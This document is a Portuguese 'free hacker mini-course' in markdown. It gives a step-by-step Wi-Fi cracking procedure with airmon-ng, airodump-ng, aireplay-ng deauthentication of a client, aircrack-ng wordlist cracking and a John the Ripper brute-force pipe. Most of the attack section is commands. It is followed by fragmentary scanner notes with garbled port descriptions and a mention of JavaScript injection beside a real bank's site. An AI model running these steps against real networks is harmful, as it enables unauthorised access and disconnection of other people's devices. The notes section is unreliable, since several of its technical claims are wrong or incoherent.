# Mini Curso Gratuito Hacker

## Vulnerabilidades em Redes Wi-Fi
### Visualizando todas as placas de rede do computador
```
airmon-ng
```

### Colocando a placa de rede em modo de monitoramento
```
iwconfig wlan1 --traz todas as informações da placa de rede selecionada
ifconfig wlan1 down
iwconfig wlan1 mode monitor
ifconfig wlan1 up
```
esse programa da suite aircrack serve para monitorar todas as redes wifi ao alcance
```
airodump-ng wlan1
```

### Visualizando todos os clientes de uma determinada rede
uma breve explicação sobre o airodump
esse e um programa que baixa os pacotes de wifi de uma determinada
rede enquanto a monitora tbm
```
airodump-ng --bssid 52:55:27:B4:4A:BC --channel 6 --write wifi wlan1
```

agora vamos forçar a desconexao de um cliente
```
aireplay-ng -0 100 -a F8:1A:67:D4:E2:60 -c 44:74:6C:F0:19:19 wlan1
```

depois de ter certeza que a pessoa foi desconectada agora iremos usar uma password list para achar a senha
temos que inserir o bssid da rede e nao do cliente atacado
```
aircrack-ng wifi-*.cap -w /root/passlist.txt -b E8:CC:18:F3:B0:80
```

caso a senha nao esteja no password list podemos tentar pelo jonh de ripper
se trata de um programa dedicado a brute force
```
john --stdout --incremental | aircrack-ng -b 00:19:5B:52:AD:F7 -w - /root/wifi*.cap
```

------------------------------------------------------------------------------------------------

Shadow security scanner
Safety-lab *cuidado tem um monte malware
Pago

Executar como administrador

New session
Complete scan
Host
Name ip: nome do site
Start scan

Ping ttl net bios 
Porta 
53 redirect de dns 
587 mail flud
110 telnet vírus com imagem

Exibe qual é a falha e como concertar

Javascript injection
Site do itau
